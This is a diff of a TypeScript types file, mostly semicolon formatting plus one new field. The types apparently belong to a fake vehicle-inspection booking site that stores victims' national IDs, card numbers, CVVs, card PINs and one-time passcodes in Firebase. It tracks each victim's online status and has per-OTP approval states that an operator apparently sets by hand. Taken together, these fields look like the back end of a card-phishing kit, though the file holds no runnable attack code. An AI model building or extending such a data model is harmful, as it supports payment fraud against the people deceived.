@@ -1,151 +1,161 @@
-import type React from "react"
+import type React from "react";
 // Core Status Types
-export type VehicleStatus = "license" | "customs"
-export type VehicleType = "car" | "motorcycle" | "truck"
-export type AppStep = "landing" | "booking" | "payment-method" | "card-form" | "pin" | "phone-verification"
-export type PaymentMethod = "card" | "wallet" | "bank"
-export type OnlineStatus = "online" | "offline"
-export type ApprovalStatus = "pending" | "approved" | "rejected"
+export type VehicleStatus = "license" | "customs";
+export type VehicleType = "car" | "motorcycle" | "truck";
+export type AppStep =
+  | "landing"
+  | "booking"
+  | "payment-method"
+  | "card-form"
+  | "pin"
+  | "phone-verification";
+export type PaymentMethod = "card" | "wallet" | "bank";
+export type OnlineStatus = "online" | "offline";
+export type ApprovalStatus = "pending" | "approved" | "rejected";
 
 // Bank Information
 export interface BankInfo {
-  name: string
-  logo: string
-  color: string
+  name: string;
+  logo: string;
+  color: string;
 }
 
 // Vehicle Type Item
 export interface VehicleTypeItem {
-  id: VehicleType
-  label: string
-  icon: React.ComponentType
+  id: VehicleType;
+  label: string;
+  icon: React.ComponentType;
 }
 
 // Inspection Type
 export interface InspectionType {
-  value: string
-  label: string
-  icon: string
+  value: string;
+  label: string;
+  icon: string;
 }
 
 // Location Types
 export interface Region {
-  value: string
-  label: string
+  value: string;
+  label: string;
 }
 
 export interface City {
-  value: string
-  label: string
+  value: string;
+  label: string;
 }
 
 export interface InspectionCenter {
-  value: string
-  label: string
+  value: string;
+  label: string;
 }
 
-export type CitiesByRegion = Record<string, City[]>
+export type CitiesByRegion = Record<string, City[]>;
 
 // Payment Method Option
 export interface PaymentMethodOption {
-  id: PaymentMethod
-  label: string
-  icon: React.ComponentType
-  description: string
-  badge?: string
-  available: boolean
+  id: PaymentMethod;
+  label: string;
+  icon: React.ComponentType;
+  description: string;
+  badge?: string;
+  available: boolean;
 }
 
 // Form State - Booking
 export interface BookingFormState {
-  vehicleStatus: VehicleStatus
-  vehicleType: VehicleType
-  plateNumbers: string
-  plateLetters: string
-  plateInfo: string
-  registrationType: string
-  ownerName: string // Added owner name field
-  nationalId: string // Added national ID field
-  country: string
-  region: string
-  city: string
-  inspectionCenter: string
-  inspectionDate: string
-  inspectionTime: string
-  inspectionType: string
-  captchaChecked: boolean
+  vehicleStatus: VehicleStatus;
+  vehicleType: VehicleType;
+  plateNumbers: string;
+  plateLetters: string;
+  plateInfo: string;
+  registrationType: string;
+  ownerName: string; // Added owner name field
+  nationalId: string; // Added national ID field
+  country: string;
+  region: string;
+  city: string;
+  inspectionCenter: string;
+  inspectionDate: string;
+  inspectionTime: string;
+  inspectionType: string;
+  captchaChecked: boolean;
 }
 
 // Form State - Payment
 export interface PaymentFormState {
-  paymentMethod: PaymentMethod | ""
-  cardNumber: string
-  cardName: string
-  expiryDate: string
-  cvv: string
-  otp: string
-  pin: string[]
-  bankInfo: BankInfo | null
-  cardOtpApproval?: ApprovalStatus
-  phoneOtpApproval?: ApprovalStatus
+  paymentMethod: PaymentMethod | "";
+  cardNumber: string;
+  cardName: string;
+  expiryDate: string;
+  cvv: string;
+  otp: string;
+  pin: string[];
+  bankInfo: BankInfo | null;
+  cardApproval: "otp" | "approved" | "pending" | "rejected";
+  cardOtpApproval?: ApprovalStatus;
+  phoneOtpApproval?: ApprovalStatus;
 }
 
 // Form State - Phone Verification
 export interface PhoneVerificationState {
-  phone: string
-  operator: string
-  phoneOtp: string
-  phoneOtpError: string
+  phone: string;
+  operator: string;
+  phoneOtp: string;
+  phoneOtpError: string;
 }
 
 // Complete App State
-export interface AppState extends BookingFormState, PaymentFormState, PhoneVerificationState {
-  currentStep: AppStep
-  isLoading: boolean
+export interface AppState
+  extends BookingFormState,
+    PaymentFormState,
+    PhoneVerificationState {
+  currentStep: AppStep;
+  isLoading: boolean;
 }
 
 // Firebase User Document
 export interface UserDocument {
-  id: string
-  status?: OnlineStatus
-  lastSeen?: string
-  createdDate: string
-  country: string
+  id: string;
+  status?: OnlineStatus;
+  lastSeen?: string;
+  createdDate: string;
+  country: string;
 
   // Vehicle Information
-  vehicleStatus?: VehicleStatus
-  vehicleType?: VehicleType
-  plateNumbers?: string
-  plateLetters?: string
-  plateInfo?: string
-  registrationType?: string
-  ownerName?: string // Added owner name field
-  nationalId?: string // Added national ID field
+  vehicleStatus?: VehicleStatus;
+  vehicleType?: VehicleType;
+  plateNumbers?: string;
+  plateLetters?: string;
+  plateInfo?: string;
+  registrationType?: string;
+  ownerName?: string; // Added owner name field
+  nationalId?: string; // Added national ID field
 
   // Appointment Details
-  region?: string
-  city?: string
-  inspectionCenter?: string
-  inspectionDate?: string
-  inspectionTime?: string
-  inspectionType?: string
+  region?: string;
+  city?: string;
+  inspectionCenter?: string;
+  inspectionDate?: string;
+  inspectionTime?: string;
+  inspectionType?: string;
 
   // Payment Information
-  paymentMethod?: PaymentMethod
-  cardNumber?: string
-  cardName?: string
-  expiryDate?: string
-  cvv?: string
-  otp?: string
-  pin?: string
+  paymentMethod?: PaymentMethod;
+  cardNumber?: string;
+  cardName?: string;
+  expiryDate?: string;
+  cvv?: string;
+  otp?: string;
+  pin?: string;
 
   // Phone Verification
-  phone?: string
-  operator?: string
-  phoneOtp?: string
+  phone?: string;
+  operator?: string;
+  phoneOtp?: string;
 
-  cardOtpApproval?: ApprovalStatus
-  phoneOtpApproval?: ApprovalStatus
+  cardOtpApproval?: ApprovalStatus;
+  phoneOtpApproval?: ApprovalStatus;
 
   // Status Tracking
   step?:
@@ -154,73 +164,73 @@ export interface UserDocument {
     | "card-details-submitted"
     | "otp-submitted"
     | "pin-submitted"
-    | "payment-completed"
-  currentPage?: string | number
-  completedDate?: string
+    | "payment-completed";
+  currentPage?: string | number;
+  completedDate?: string;
 }
 
 // Firebase Data Submission Types
 export interface BookingSubmission {
-  id: string
-  vehicleStatus: VehicleStatus
-  country: string
-  plateNumbers: string
-  plateLetters: string
-  plateInfo: string
-  registrationType: string
-  vehicleType: VehicleType
-  ownerName: string // Added owner name field
-  nationalId: string // Added national ID field
-  region: string
-  city: string
-  inspectionCenter: string
-  inspectionDate: string
-  inspectionTime: string
-  inspectionType: string
-  step: "booking-completed"
+  id: string;
+  vehicleStatus: VehicleStatus;
+  country: string;
+  plateNumbers: string;
+  plateLetters: string;
+  plateInfo: string;
+  registrationType: string;
+  vehicleType: VehicleType;
+  ownerName: string; // Added owner name field
+  nationalId: string; // Added national ID field
+  region: string;
+  city: string;
+  inspectionCenter: string;
+  inspectionDate: string;
+  inspectionTime: string;
+  inspectionType: string;
+  step: "booking-completed";
 }
 
 export interface PaymentMethodSubmission {
-  id: string
-  paymentMethod: PaymentMethod
-  step: "payment-method-selected"
+  id: string;
+  paymentMethod: PaymentMethod;
+  step: "payment-method-selected";
 }
 
 export interface CardDetailsSubmission {
-  id: string
-  cardNumber: string
-  cardName: string
-  expiryDate: string
-  cvv: string
-  step: "card-details-submitted"
+  id: string;
+  cardNumber: string;
+  cardName: string;
+  expiryDate: string;
+  cvv: string;
+  step: "card-details-submitted";
 }
 
 export interface OtpSubmission {
-  id: string
-  otp: string
-  step: "otp-submitted"
+  id: string;
+  otp: string;
+  step: "otp-submitted";
 }
 
 export interface PinSubmission {
-  id: string
-  pin: string
-  step: "pin-submitted"
+  id: string;
+  pin: string;
+  step: "pin-submitted";
 }
 
 export interface FinalSubmission {
-  id: string
-  phone: string
-  operator: string
-  phoneOtp: string
-  step: "payment-completed"
-  completedDate: string
+  id: string;
+  phone: string;
+  operator: string;
+  phoneOtp: string;
+  step: "payment-completed";
+  completedDate: string;
 }
 
 // BIN Database Type
-export type BinDatabase = Record<string, BankInfo>
+export type BinDatabase = Record<string, BankInfo>;
 
 // API Response Types
 export interface FirestoreResponse {
-  success: boolean
-  error?: any
+  success: boolean;
+  error?: any;
 }
